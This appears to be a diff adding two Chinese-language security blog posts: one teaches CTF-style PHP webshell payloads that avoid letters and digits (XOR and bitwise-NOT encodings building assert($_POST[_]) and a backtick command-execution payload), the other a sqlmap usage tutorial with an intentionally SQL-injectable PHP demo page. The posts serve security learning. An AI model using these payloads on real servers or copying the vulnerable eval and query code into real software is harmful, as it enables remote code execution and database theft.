@@ -165,6 +165,242 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="yoyo">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yoyo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">无字母数字webshell基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-01 16:30:06" itemprop="dateCreated datePublished" datetime="2020-11-01T16:30:06+08:00">2020-11-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-03 19:22:37" itemprop="dateModified" datetime="2020-11-03T19:22:37+08:00">2020-11-03</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>无字母数字webshell简单来说就是payload中不能出现字母，数字（有些题目还有其他一些过滤），通过异或取反等方法取得flag。</p>
+<h3 id="测试源码"><a href="#测试源码" class="headerlink" title="测试源码"></a>测试源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果shell中不还有字母和数字，则可以执行eval语句</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>异或的符号是<code>^</code>,是一种运算符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行该脚本我们知道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%81^%FF&#x3D;&gt;~     %82^%FF&#x3D;&gt;&#125;       %83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;     %85^%FF&#x3D;&gt;z       %86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x     %88^%FF&#x3D;&gt;w       %89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u     %8B^%FF&#x3D;&gt;t       %8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r     %8E^%FF&#x3D;&gt;q       %8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o     %91^%FF&#x3D;&gt;n       %92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l     %94^%FF&#x3D;&gt;k       %95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i     %97^%FF&#x3D;&gt;h       %98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f     %9A^%FF&#x3D;&gt;e       %9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c     %9D^%FF&#x3D;&gt;b       %9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;     %A0^%FF&#x3D;&gt;_       %A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]     %A3^%FF&#x3D;&gt;\       %A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z     %A6^%FF&#x3D;&gt;Y       %A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W     %A9^%FF&#x3D;&gt;V       %AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T     %AC^%FF&#x3D;&gt;S       %AD^%FF&#x3D;&gt;R    </span><br><span class="line">%AE^%FF&#x3D;&gt;Q     %AF^%FF&#x3D;&gt;P       %B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N     %B2^%FF&#x3D;&gt;M       %B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K     %B5^%FF&#x3D;&gt;J       %B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H     %B8^%FF&#x3D;&gt;G       %B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E     %BB^%FF&#x3D;&gt;D       %BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B     %BE^%FF&#x3D;&gt;A       %BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br></pre></td></tr></table></figure>
+
+<p>通过这种方法构造一个phpinfo()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br><span class="line">我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。 %A0^%FF=&gt;_ </span><br><span class="line">%B8^%FF=&gt;G</span><br><span class="line">%BA^%FF=&gt;E  </span><br><span class="line">%AB^%FF=&gt;T </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/phpinfo.png"></p>
+<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p>
+<p>直接看如何构造phpinfo()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/%E5%8F%96%E5%8F%8D.png" alt="取反"></p>
+<p>可以看出，自己对phpinfo取反，会产生一些不可见字符，可对phpinfo取反后再进行url编码。</p>
+<h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/%E5%8F%96%E5%8F%8D1.png" alt="取反1"></p>
+<h3 id="构造assert字符"><a href="#构造assert字符" class="headerlink" title="构造assert字符"></a>构造assert字符</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span>E^%FF=&gt;a</span><br><span class="line"> %<span class="number">8</span>C^%FF=&gt;s</span><br><span class="line"> %<span class="number">9</span>A^%FF=&gt;e</span><br><span class="line"> %<span class="number">8</span>D^%FF=&gt;r</span><br><span class="line"> %<span class="number">8</span>B^%FF=&gt;t</span><br><span class="line"> </span><br><span class="line">  %A0^%FF=&gt;_    </span><br><span class="line"> %AF^%FF=&gt;P </span><br><span class="line"> %B0^%FF=&gt;O</span><br><span class="line"> %AC^%FF=&gt;S</span><br><span class="line"> %AB^%FF=&gt;T </span><br><span class="line">    </span><br><span class="line">$_=<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$__=<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%8F%96%E5%8F%8D2.png" alt="取反2"></p>
+<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p><strong>脚本</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$result1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$result2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($num=<span class="number">0</span>;$num&lt;=strlen($shell);$num++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($x=<span class="number">33</span>;$x&lt;<span class="number">126</span>;$x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>($y=<span class="number">33</span>;$y&lt;=<span class="number">126</span>;$y++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f = chr($x)^chr($y);</span><br><span class="line">                    <span class="keyword">if</span>($f == $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .= chr($x);</span><br><span class="line">                        $result2 .= chr($y);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $result1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $result2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">$c</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本可以将“assert”变成两个字符串异或的结果，通过更改shell的值可以构造出我们想要的字符串。为了便于表示，生成字符串的范围为33-126（可见字符）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//构造出assert</span></span><br><span class="line">$__ = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//构造出_POST</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___ = $_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell&#x3D;%24_+%3d+%22!((%25)(%22^%22%40[[%40[\\%22%3b%24__+%3d+%22!%2b%2f((%22^%22~&#123;&#96;&#123;|%22%3b%24___+%3d+%24%24__%3b%24_(%24___[_])%3b</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/%E5%BC%82%E6%88%962.png" alt="异或2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_ &#x3D; &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;</span><br><span class="line">$__ &#x3D; &quot;!+&#x2F;((&quot;^&quot;~&#123;&#96;&#123;|&quot;;  </span><br><span class="line">$___ &#x3D; $$__; </span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%BC%82%E6%88%967.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%5f%3d%22%21%28%28%25%29%28%22%5e%22%40%5b%5b%40%5b%5c%5c%22%3b%24%5f%5f%3d%22%21%2b%2f%28%28%22%5e%22%7e%7b%60%7b%7c%22%3b%24%5f%5f%5f%3d%24%24%5f%5f%3b%24%5f%28%24%5f%5f%5f%5b%5f%5d%29%3b</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%BC%82%E6%88%966.png" alt="异或6"></p>
+<h4 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"></span><br><span class="line">$b = urlencode(~<span class="string">&#x27;_POST&#x27;</span>);</span><br><span class="line"><span class="comment">//%A0%AF%B0%AC%AB</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line">$__ = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___=$_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=$_=~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;$__=~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%8F%96%E5%8F%8D3.png" alt="取反3"></p>
+<h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了_</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析下这个Payload，?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~”%a0%b8%ba%ab”为”_GET”，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/get.png" alt="get"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/31/SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="yoyo">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yoyo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/31/SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">SQL注入工具</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-31 16:16:49" itemprop="dateCreated datePublished" datetime="2020-10-31T16:16:49+08:00">2020-10-31</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞。</p>
+<h3 id="一，sqlmap参数"><a href="#一，sqlmap参数" class="headerlink" title="一，sqlmap参数"></a>一，sqlmap参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-db database</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–tables  -T 指定表名 </span><br><span class="line"> -D 列出指定数据库的表</span><br><span class="line">--columns 获取列</span><br><span class="line">--count 获取有几行数据 </span><br><span class="line">-C 读取数据（例如-C “username,password”）</span><br><span class="line">--dump 导出数据</span><br><span class="line">--level5：探测等级</span><br><span class="line">--roles：列出数据库管理员角色</span><br><span class="line">-sql-shell:运行自定义SQL语句</span><br><span class="line">-file-read:从数据库服务器中读取文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--referer:HTTP Referer头  (-r REQUESTFILE 从一个文件中载入HTTP请求。)</span><br><span class="line">SQL可以在请求中伪造HTTP的referer，当--level参数设定为3或者3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如--referer http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER 可注入的参数</span><br><span class="line">–proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">–data</span><br><span class="line">data后面的数据是以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数</span><br><span class="line">sqlmap -u “http:&#x2F;&#x2F;192.168.120.249&#x2F;baji&#x2F;login.php” --data&#x3D;“username&#x3D;111111&amp;password&#x3D;111111”</span><br></pre></td></tr></table></figure>
+
+<h3 id="二，判断是否存在注入"><a href="#二，判断是否存在注入" class="headerlink" title="二，判断是否存在注入"></a>二，判断是否存在注入</h3><p><strong>利用下列代码进行演示</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$data = $conn-&gt;query(<span class="string">&quot;select * from good where id=&quot;</span>.$id);</span><br><span class="line">$result= $data-&gt;fetch_array(MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> $result[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $result[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap1.png" alt="sqlmap1"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap2.png" alt="sqlmap2"></p>
+<p>当注入点后面的参数大于等于两个时，需要加双引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1.php?id&#x3D;1&amp;uid&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<h4 id="判断文本当中的请求是否存在注入"><a href="#判断文本当中的请求是否存在注入" class="headerlink" title="判断文本当中的请求是否存在注入"></a>判断文本当中的请求是否存在注入</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /sql1.php?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: bilibili Security Browser</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p>将该HTTP请求保存为1.txt</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap3.png" alt="sqlmap3"></p>
